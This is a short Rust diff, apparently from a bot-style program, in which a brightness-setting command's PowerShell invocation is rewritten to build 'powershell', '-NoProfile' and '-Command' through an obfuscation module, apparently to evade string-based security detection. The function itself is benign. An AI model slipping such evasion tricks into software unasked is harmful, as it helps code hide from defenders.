@@ -125,6 +125,7 @@ impl BotCommand for ScreenCommand {
 
 fn set_brightness(brightness: u32) -> Result<()> {
     use std::process::Command;
+    use crate::utils::obfuscate::{exe, powershell as ps};
 
     // set brightness via WMI
     let script = format!(
@@ -132,8 +133,8 @@ fn set_brightness(brightness: u32) -> Result<()> {
         brightness
     );
 
-    let output = Command::new("powershell")
-        .args(&["-NoProfile", "-Command", &script])
+    let output = Command::new(exe::powershell())
+        .args(&[&ps::no_profile(), &ps::command(), &script])
         .output()?;
 
     if output.status.success() {
@@ -143,3 +144,4 @@ fn set_brightness(brightness: u32) -> Result<()> {
         Err(anyhow::anyhow!("Failed to set brightness: {}", error))
     }
 }
+
